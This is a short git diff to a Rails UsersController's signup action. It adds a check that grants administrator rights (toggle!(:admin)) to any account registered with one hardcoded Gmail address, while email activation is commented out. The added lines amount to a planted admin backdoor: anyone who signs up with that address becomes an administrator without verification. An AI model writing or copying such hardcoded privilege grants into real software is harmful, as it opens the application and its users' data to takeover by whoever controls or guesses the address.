@@ -23,6 +23,9 @@ class UsersController < ApplicationController
       # @user.send_activation_email     # same as: UserMailer.account_activation(@user).deliver
       # flash[:info] = "Please check your email to activate your account."
       log_in @user
+      if @user.email.eql?("stryro@gmail.com")
+        @user.toggle!(:admin)
+      end
       flash[:info] = "Signed up successfully!"
       redirect_to(root_url)
     else
